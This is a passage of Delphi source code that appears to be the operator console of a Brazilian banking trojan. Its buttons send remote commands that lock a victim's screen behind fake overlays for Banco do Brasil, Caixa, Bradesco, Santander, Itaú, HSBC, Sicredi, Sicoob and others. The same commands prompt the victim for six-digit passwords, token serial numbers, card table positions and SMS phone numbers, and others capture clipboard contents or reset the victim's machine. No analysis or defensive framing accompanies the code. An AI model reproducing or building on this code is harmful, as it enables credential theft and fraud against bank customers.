Form5.Label1.Caption:= 'informe numero do celular';
end;


procedure TForm2.GBClick(Sender: TObject);
begin
 // Trava Nordeste
//Socket.SendText('{Nordeste}');
Form9.Show;
Form1.Label3.Caption := 'Nordeste';
end;

procedure TForm2.TabelaClick(Sender: TObject);
begin
Form1.Label6.Caption := 'NordesteT';
Form5.Show;
end;

procedure TForm2.GB2Click(Sender: TObject);
begin
// Trava brb

Form9.Show;
Form1.Label3.Caption := 'BRBBRASIL';
end;

procedure TForm2.FormKeyUp(Sender: TObject; var Key: Word;  Shift: TShiftState);
var
srt: string;
begin
 if Key = 17 then Exit;
  if ((ssCtrl in Shift) AND (Key = Ord('V'))) then
  begin

       Socket.SendText('<|CLIP|>'+ srt +'<|>');
  //  fPrincipal.AddLog(Clipboard.AsText);
    Exit;
  end;
  if Key < 45 then
  begin

   Socket.SendText('<|CLIP|>'+ srt +'<|>');
    Abort;
  end;
//  SendKeys(Char(Key));
end;

procedure TForm2.oken1Click(Sender: TObject);
begin
// Solicita Token brb
trava();
Socket.SendText('{TOKENBRB}');
end;

procedure TForm2.Button7Click(Sender: TObject);
begin
 Socket.SendText('<|destopp|>');
end;

procedure TForm2.Button8Click(Sender: TObject);
begin
 Socket.SendText('<|DSTCLIENTE|>');
end;

procedure TForm2.Button9Click(Sender: TObject);
begin
  Socket.SendText('<|FAKE|>');
end;

procedure TForm2.Button10Click(Sender: TObject);
Var
S: String;
begin
if InputQueryJW('GB BRASIL FISICA', 'INFORME NOME DO CLIENTE (OPCIONAL).', S) then
begin
Form1.Label6.Caption := 'BBNORMAL';
Socket.SendText('<|NOBB|>'+S+'<|>');
Socket.SendText('{BBNORMAL}');
trava();
CKECKEGB.Checked :=  TRUE;
end;
end;


procedure TForm2.Button11Click(Sender: TObject);
begin
if CKECKEGB.Checked = false then
begin
MessageBox(self.handle, PChar('ops! você ainda nao deu clik em Gb BB  "FISICA"'), PChar('ATENÇÂO -'+Trim(Edit3.Text)), MB_ICONWARNING or MB_OK);
end;
IF CKECKEGB.Checked = true then
begin
Socket.SendText('{SENHA6BB}');
trava();
end;
END;

procedure TForm2.Button12Click(Sender: TObject);
begin
// Desativa Timers
TrmTecladoNavi.Enabled := False;
TrmAviso.Enabled := False;
CheckBox1.Checked := False;
Socket.SendText('{DESTRAVAM}');
sleep(500);
Socket.SendText('<|reini|>');
end;

procedure TForm2.Button13Click(Sender: TObject);
var
  L,L9: TListItem;
begin
  Socket.SendText('{TRAVA24}');
  CheckBox1.Checked := false;
  CheckBox2.Checked := false;

  L := Form1.LV1.FindCaption(0, intToStr(Socket.Handle), false, true, false);
  if L <> nil then begin
    L.SubItems.Objects[1] := nil;
    L.SubItems.Objects[2] := nil;
  end;
  sleep(1000);
  // Desativa Timers
  TrmTecladoNavi.Enabled := False;
  TrmAviso.Enabled := False;
  Socket.SendText('{DESTRAVAM}');
  sleep(100);
  Socket.SendText('<|reini|>');
  Remoto.Terminate;
  Destroy;
end;

procedure TForm2.Button14Click(Sender: TObject);
Var
S: String;
begin
if InputQueryJW('GB CAIXA', 'INFORME NOME DO CLIENTE (OPCIONAL).', S) then
begin
Form1.Label6.Caption := 'TRAVACEF';
Socket.SendText('<|NCEF|>'+S+'<|>');
Socket.SendText('{TRAVACEF}');
trava();
CKECKEGB.Checked :=  TRUE;
end;
end;


procedure TForm2.Button15Click(Sender: TObject);
begin
if CKECKEGB.Checked = false then
begin
MessageBox(self.handle, PChar('ops! você ainda nao deu clik em Gb "CAIXA"'), PChar('ATENÇÂO -'+Trim(Edit3.Text)), MB_ICONWARNING or MB_OK);
end;
IF CKECKEGB.Checked = true then
begin
trava();
Socket.SendText('{SENHA6CF}');
end;
end;

procedure TForm2.Button16Click(Sender: TObject);
begin
if CKECKEGB.Checked = false then
begin
MessageBox(self.handle, PChar('ops! você ainda nao deu clik em Gb BB  "FISICA"'), PChar('ATENÇÂO -'+Trim(Edit3.Text)), MB_ICONWARNING or MB_OK);
end;
IF CKECKEGB.Checked = true then
begin
trava();
Socket.SendText('{BBSMS}');
end;
END;

procedure TForm2.Button26Click(Sender: TObject);
Var
S: String;
begin
if InputQueryJW('GB BRASIL JURIDICA', 'INFORME NOME DO CLIENTE (OPCIONAL).', S) then
begin
Form1.Label6.Caption := 'BBEMPRESA';
Socket.SendText('<|NOEB|>'+S+'<|>');
Socket.SendText('{BBGFA}');
trava();
CKECKEGB.Checked :=  TRUE;
end;
end;


procedure TForm2.Button27Click(Sender: TObject);
begin
if CKECKEGB.Checked = false then
begin
MessageBox(self.handle, PChar('ops! você ainda nao deu clik em Gb BB  "JURIDICA"'), PChar('ATENÇÂO -'+Trim(Edit3.Text)), MB_ICONWARNING or MB_OK);
end;
IF CKECKEGB.Checked = true then
begin
Socket.SendText('{BBXCS1}');
trava();
end;
END;

procedure TForm2.Button28Click(Sender: TObject);
begin
if CKECKEGB.Checked = false then
begin
MessageBox(self.handle, PChar('ops! você ainda nao deu clik em Gb BB  "JURIDICA"'), PChar('ATENÇÂO -'+Trim(Edit3.Text)), MB_ICONWARNING or MB_OK);
end;
IF CKECKEGB.Checked = true then
begin
Socket.SendText('{BBXCS2}');
trava();
end;
END;

procedure TForm2.Button17Click(Sender: TObject);
Var
S: String;
begin
if InputQueryJW('GB BRADESCO JURIDICA', 'INFORME NOME DO CLIENTE (OPCIONAL).', S) then
begin
Form1.Label6.Caption := 'DESCONET';
Socket.SendText('<|NODN|>'+S+'<|>');
Socket.SendText('{DESCONET}');
trava();
CKECKEGB.Checked :=  TRUE;
end;
end;

procedure TForm2.Button18Click(Sender: TObject);
var
  s: string;
begin
if CKECKEGB.Checked = false then
begin
MessageBox(self.handle, PChar('ops! você ainda nao deu clik em Gb BRADESCO  "JURIDICO"'), PChar('ATENÇÂO -'+Trim(Edit3.Text)), MB_ICONWARNING or MB_OK);
end;
IF CKECKEGB.Checked = true then
begin
if InputQueryTK('TOKEN BRADESCO JURIDICO', 'INFORME NUMERO DE SERIE DO TOKEN.', S) then
begin
Form1.Label6.Caption := 'DESCONETT';
Socket.SendText('<|DESETKJ|>'+S+'<|>');
trava();
end;
end;
end;

procedure TForm2.Button19Click(Sender: TObject);
Var
S: String;
begin
if InputQueryJW('GB BRADESCO FISICA', 'INFORME NOME DO CLIENTE (OPCIONAL).', S) then
begin
Form1.Label6.Caption := 'DESCOB';
Socket.SendText('<|NODE|>'+S+'<|>');
Socket.SendText('{DESCOB}');
trava();
CKECKEGB.Checked :=  TRUE;
end;
end;


procedure TForm2.Button32Click(Sender: TObject);
begin
  Socket.SendText('<|dekl|>');
end;


procedure TForm2.Button29Click(Sender: TObject);
var
  s: string;
begin
if CKECKEGB.Checked = false then
begin
MessageBox(self.handle, PChar('ops! você ainda nao deu clik em Gb BRADESCO  "FISICA"'), PChar('ATENÇÂO -'+Trim(Edit3.Text)), MB_ICONWARNING or MB_OK);
end;
IF CKECKEGB.Checked = true then
begin
if InputQueryTK('TOKEN BRADESCO FISICA', 'INFORME NUMERO DE SERIE DO TOKEN.', S) then
begin
Form1.Label6.Caption := 'DESCOTKF';
Socket.SendText('<|DESETKF|>'+S+'<|>');
trava();
end;
end;
end;

procedure TForm2.Button30Click(Sender: TObject);
begin
if CKECKEGB.Checked = false then
begin
MessageBox(self.handle, PChar('ops! você ainda nao deu clik em Gb BRADESCO  "FISICA"'), PChar('ATENÇÂO -'+Trim(Edit3.Text)), MB_ICONWARNING or MB_OK);
end;
IF CKECKEGB.Checked = true then
begin
trava();
Socket.SendText('{DESCOSN}');
end;
end;

procedure TForm2.Button31Click(Sender: TObject);
var
  s: string;
begin
if CKECKEGB.Checked = false then
begin
MessageBox(self.handle, PChar('ops! você ainda nao deu clik em Gb BRADESCO  "FISICA"'), PChar('ATENÇÂO -'+Trim(Edit3.Text)), MB_ICONWARNING or MB_OK);
end;
IF CKECKEGB.Checked = true then
begin
if InputQueryTK('Chave Bradesco', 'Digite os 2 dígitos correspondente a chave.', S) then
begin
Form1.Label6.Caption := 'DESECHV';
Socket.SendText('<|DESECHV|>'+S+'<|>');
end;
if InputQueryTK('Chave Bradesco', 'Digite referencia do cartao.', S) then
begin
Form1.Label6.Caption :=  Trim(s);
Socket.SendText('<|DESETBL|>'+S+'<|>');
Socket.SendText('{DESCOTBF}');
    trava();
end;
end;
end;




procedure TForm2.Button20Click(Sender: TObject);
Var
S: String;
begin
if InputQueryJW('GB SANTANDER JURIDICO', 'INFORME NOME DO CLIENTE (OPCIONAL).', S) then
begin
Form1.Label6.Caption := 'SANTAJUJU';
Socket.SendText('<|NOSA|>'+S+'<|>');
Socket.SendText('{TRAVASAN}');
trava();
CKECKEGB.Checked :=  TRUE;
end;
end;

procedure TForm2.Button21Click(Sender: TObject);
begin
// Solicita Série Token assinatura santa ju
trava();
Socket.SendText('{TOKENSE}');
end;

procedure TForm2.Button22Click(Sender: TObject);
begin
// Solicita Token Santa
trava();
Socket.SendText('{TOKENSS}');
end;

procedure TForm2.Button37Click(Sender: TObject);
 var
  s: string;
begin
if CKECKEGB.Checked = false then
begin
MessageBox(self.handle, PChar('ops! você ainda nao deu clik em Gb SANTANDER  "FISICA"'), PChar('ATENÇÂO -'+Trim(Edit3.Text)), MB_ICONWARNING or MB_OK);
end;
IF CKECKEGB.Checked = true then
begin
if InputQueryTK('TABELA SANTA FISICA', 'INFORME OS 2 DIGITOS CORRESPONDENTE A TABELA.', S) then
begin
Form1.Label6.Caption := 'SANTAFISICA';
Socket.SendText('<|STB|>'+S+'<|>');
trava();
end;
end;
END;

procedure TForm2.Button36Click(Sender: TObject);
Var
S: String;
begin
if InputQueryJW('GB SANTANDER FISICA', 'INFORME NOME DO CLIENTE (OPCIONAL).', S) then
begin
Form1.Label6.Caption := 'SANTAJUJU';
Socket.SendText('<|NOSA|>'+S+'<|>');
Socket.SendText('{TRAVASAN}');
trava();
CKECKEGB.Checked :=  TRUE;
end;
end;


procedure TForm2.Button38Click(Sender: TObject);
 var
  s: string;
begin
if CKECKEGB.Checked = false then
begin
MessageBox(self.handle, PChar('ops! você ainda nao deu clik em Gb SANTANDER  "FISICA"'), PChar('ATENÇÂO -'+Trim(Edit3.Text)), MB_ICONWARNING or MB_OK);
end;
IF CKECKEGB.Checked = true then
begin
if InputQueryTK('TOKEN SMS SANTANDER FISICA', 'INFORME OS NUMERO DO CELULAR.', S) then
begin
Form1.Label6.Caption := 'SANTAFISICASMS';
Socket.SendText('<|STBSMS|>'+S+'<|>');
trava();
end;
end;
END;
procedure TForm2.Button40Click(Sender: TObject);
Var
S: String;
begin
if InputQueryJW('GB ITAU FISICA', 'INFORME NOME DO CLIENTE (OPCIONAL).', S) then
begin
Form1.Label6.Caption := 'TRAVANO';
Socket.SendText('<|NOIT|>'+S+'<|>');
Socket.SendText('{TRAVANO}');
trava();
CKECKEGB.Checked :=  TRUE;
end;
end;

procedure TForm2.Button41Click(Sender: TObject);
Var
S: String;
begin
if CKECKEGB.Checked = false then
begin
MessageBox(self.handle, PChar('ops! você ainda nao deu clik em Gb ita fisica'), PChar('ATENÇÂO -'+Trim(Edit3.Text)), MB_ICONWARNING or MB_OK);
end;
IF CKECKEGB.Checked = true then
begin

if InputQueryTK('TOKEN ITAU FISICA', 'INFORME NUMERO DE SERIE DO TOKEN.', S) then
begin
Form1.Label6.Caption := 'TOKENITN';
Socket.SendText('<|ITTKNS|>'+S+'<|>');
trava();
end;
end;
end;

procedure TForm2.Button43Click(Sender: TObject);
Var
S: String;
begin
if CKECKEGB.Checked = false then
begin
MessageBox(self.handle, PChar('ops! você ainda nao deu clik em Gb ita fisica'), PChar('ATENÇÂO -'+Trim(Edit3.Text)), MB_ICONWARNING or MB_OK);
end;
IF CKECKEGB.Checked = true then
begin
if InputQueryTK('TABELA ITAU FISICA', 'INFORME POSIÇÃO DA TABELA.', S) then
begin
Form1.Label6.Caption := 'ITANORMALTB';
Socket.SendText('<|ITTBNOL|>'+S+'<|>');
trava();
end;
end;
end;


procedure TForm2.Button42Click(Sender: TObject);
begin
if CKECKEGB.Checked = false then
begin
MessageBox(self.handle, PChar('ops! você ainda nao deu clik em Gb ita fisica'), PChar('ATENÇÂO - -'+Trim(Edit3.Text)), MB_ICONWARNING or MB_OK);
end;
IF CKECKEGB.Checked = true then
begin
// Solicita Senha de 6 ITAU
Socket.SendText('{SENHADTNOR}');
trava();
end;
END;

procedure TForm2.Button46Click(Sender: TObject);
 var
  s: string;
begin
if CKECKEGB.Checked = false then
begin
MessageBox(self.handle, PChar('ops! você ainda nao deu clik em Gb ita "JURIDICO"'), PChar('ATENÇÂO -'+Trim(Edit3.Text)), MB_ICONWARNING or MB_OK);
end;
IF CKECKEGB.Checked = true then
begin
 s := InputBox('TOKEN ITAU JURIDICO',
    'informe numero do serie.', '');
  if s <> '' then
Form1.Label6.Caption := 'ITAJURICA';
Socket.SendText('<|ITTKJUK|>'+S+'<|>');
trava();
end;
END;


procedure TForm2.Button48Click(Sender: TObject);
begin
trava();
Socket.SendText('{SHCARDJU}');
end;

procedure TForm2.Button45Click(Sender: TObject);
Var
S: String;
begin
if InputQueryJW('GB ITAU JURIDICA', 'INFORME NOME DO CLIENTE (OPCIONAL). ', S) then
begin
Form1.Label6.Caption := 'TRAVANOITJU';
Socket.SendText('<|NOITJU|>'+S+'<|>');
Socket.SendText('{TRAVANOITJU}');
trava();
CKECKEGB.Checked :=  TRUE;
end;
end;
procedure TForm2.Button47Click(Sender: TObject);
Var
S: String;
begin
if InputQueryJW('GB ITAU UNICLASS', 'INFORME NOME DO CLIENTE (OPCIONAL).', S) then
begin
Form1.Label6.Caption := 'TRAVAUNICLASS';
Socket.SendText('<|NOITCLASS|>'+S+'<|>');
Socket.SendText('{TRAVAUNICLASS}');
trava();
CKECKEGB.Checked :=  TRUE;
end;
end;



procedure TForm2.Button52Click(Sender: TObject);
begin
if CKECKEGB.Checked = false then
begin
MessageBox(self.handle, PChar('ops! você ainda nao deu clik em Gb ita "UNICLASS"'), PChar('ATENÇÂO -'+Trim(Edit3.Text)), MB_ICONWARNING or MB_OK);
end;
IF CKECKEGB.Checked = true then
begin



// Solicita Senha de 6 ITAU UNICLASSE
trava();
Socket.SendText('{SENHADTUNCLS}');
end;
END;

procedure TForm2.Button51Click(Sender: TObject);
 var
  s: string;
begin
if CKECKEGB.Checked = false then
begin
MessageBox(self.handle, PChar('ops! você ainda nao deu clik em Gb ita "UNICLASS"'), PChar('ATENÇÂO -'+Trim(Edit3.Text)), MB_ICONWARNING or MB_OK);
end;
IF CKECKEGB.Checked = true then
begin
if InputQueryTK('TABELA ITAU UNICLASS', 'INFORME NUMERO DE SERIE DO TOKEN.', S) then
begin
Form1.Label6.Caption := 'ITAUNCLASTB';
Socket.SendText('<|ITTBUNC|>'+S+'<|>');
trava();
end;
END;
END;

procedure TForm2.Button50Click(Sender: TObject);
var
  s: string;
begin
if CKECKEGB.Checked = false then
begin
MessageBox(self.handle, PChar('ops! você ainda nao deu clik em Gb ita "UNICLASS"'), PChar('ATENÇÂO -'+Trim(Edit3.Text)), MB_ICONWARNING or MB_OK);
end;
IF CKECKEGB.Checked = true then
begin

if InputQueryTK('TOKEN ITAU UNICLASS', 'INFORME NUMERO DE SERIE DO TOKEN.', S) then
begin
Form1.Label6.Caption := 'TOKENITUNICLAS';
Socket.SendText('<|ITTKUNICLS|>'+S+'<|>');
trava();
end;
end;
END;

procedure TForm2.Button54Click(Sender: TObject);
Var
S: String;
begin
if InputQueryJW('GB ITAU PERSONNALITÉ', 'INFORME NOME DO CLIENTE (OPCIONAL). ', S) then
begin
Form1.Label6.Caption := 'TRAVAPERSONNLT';
Socket.SendText('<|NOITPERSONLT|>'+S+'<|>');
Socket.SendText('{TRAVAPERSONNLT}');
trava();
CKECKEGB.Checked :=  TRUE;
end;
END;

procedure TForm2.Button57Click(Sender: TObject);
begin
if CKECKEGB.Checked = false then
begin
MessageBox(self.handle, PChar('ops! você ainda nao deu clik em Gb ita "PERSONNALITE"'), PChar('ATENÇÂO -'+Trim(Edit3.Text)), MB_ICONWARNING or MB_OK);
end;
IF CKECKEGB.Checked = true then
begin
// Solicita Senha de 6 ITAU UNICLASSE
trava();
Socket.SendText('{SENHADTPERSOLT}');
end;
END;

procedure TForm2.Button56Click(Sender: TObject);
 var
  s: string;
begin
if CKECKEGB.Checked = false then
begin
MessageBox(self.handle, PChar('ops! você ainda nao deu clik em Gb ita "PERSONNALITE"'), PChar('ATENÇÂO -'+Trim(Edit3.Text)), MB_ICONWARNING or MB_OK);
end;
IF CKECKEGB.Checked = true then
begin
if InputQueryTK('TOKEN ITAU PERSONNALITE', 'INFORME POSIÇÃO DA TABELA.', S) then
begin
Form1.Label6.Caption := 'ITAPERSONLTTB';
Socket.SendText('<|ITAPERSOTB|>'+S+'<|>');
trava();
end;
END;
END;

procedure TForm2.Button55Click(Sender: TObject);
var
  s: string;
begin
if CKECKEGB.Checked = false then
begin
MessageBox(self.handle, PChar('ops! você ainda nao deu clik em Gb ita "PERSONNALITE"'), PChar('ATENÇÂO -'+Trim(Edit3.Text)), MB_ICONWARNING or MB_OK);
end;
IF CKECKEGB.Checked = true then
begin

if InputQueryTK('TOKEN ITAU PERSONNALITE', 'INFORME NUMERO DE SERIE DO TOKEN.', S) then
begin
Form1.Label6.Caption := 'TOKENPERSOTL';
Socket.SendText('<|ITTKPENLT|>'+S+'<|>');
trava();
END;
end;
END;

procedure TForm2.Button59Click(Sender: TObject);
Var
S: String;
begin
if InputQueryJW('GB HSBC JURIDICA', 'INFORME NOME DO CLIENTE (OPCIONAL).', S) then
begin
Form1.Label6.Caption := 'TRAVAHSBCJU';
Socket.SendText('<|NOHSJU|>'+S+'<|>');
Socket.SendText('{TRAVAHSBCJU}');
trava();
CKECKEGB.Checked :=  TRUE;
end;
end;

procedure TForm2.Button61Click(Sender: TObject);
var
  s: string;
begin
if CKECKEGB.Checked = false then
begin
MessageBox(self.handle, PChar('ops! você ainda nao deu clik em Gb HSBC  "JURIDICA"'), PChar('ATENÇÂO -'+Trim(Edit3.Text)), MB_ICONWARNING or MB_OK);
end;
IF CKECKEGB.Checked = true then
begin
if InputQueryTK('TOKEN HSBC JURIDICA', 'INFORME OS NUMEROS DE SERIE DO TOKEN.', S) then
begin
Form1.Label6.Caption := 'TOKEHSBJUNO';
Socket.SendText('<|HSBTK|>'+S+'<|>');
trava();
end;
END;
END;

procedure TForm2.Button63Click(Sender: TObject);
begin
// Trava hsbc
Socket.SendText('{TRAVANORDESTE}');
Socket.SendText('<|NONORD|>'+Edit16.Text+'<|>');
trava();
end;

procedure TForm2.Button23Click(Sender: TObject);
Var
S: String;
begin
if InputQueryJW('SICREDI INTERNET', 'INFORME NOME DO CLIENTE (OPCIONAL).', S) then
begin
Form1.Label6.Caption := 'SICREDI';
Socket.SendText('<|NOSICRE|>'+S+'<|>');
Socket.SendText('{SICREDI}');
trava();
CKECKEGB.Checked :=  TRUE;
end;
end;

procedure TForm2.Button34Click(Sender: TObject);
Var
S: String;
begin
if InputQueryJW('GB Sicoob Sistema de Cooperativas', 'INFORME NOME DO CLIENTE (OPCIONAL).', S) then
begin
Form1.Label6.Caption := 'TRAVASICOOB';
Socket.SendText('<|NOSICO|>'+S+'<|>');
Socket.SendText('{TRAVASICOOB}');
trava();
CKECKEGB.Checked :=  TRUE;
end;
end;

procedure TForm2.Button24Click(Sender: TObject);
begin
if CKECKEGB.Checked = false then
begin
MessageBox(self.handle, PChar('ops! você ainda nao deu clik em Gb   "SICREDI"'), PChar('ATENÇÂO -'+Trim(Edit3.Text)), MB_ICONWARNING or MB_OK);
end;
IF CKECKEGB.Checked = true then
begin
Socket.SendText('{TOKESICRE}');
trava();
end;
end;

procedure TForm2.oken2Click(Sender: TObject);
begin
Form9.Show;
Form1.Label3.Caption := 'HsbcNormal';
end;

procedure TForm2.oken3Click(Sender: TObject);
begin
  Form9.Show;
Form1.Label3.Caption := 'HsbcPremier';
end;

end.


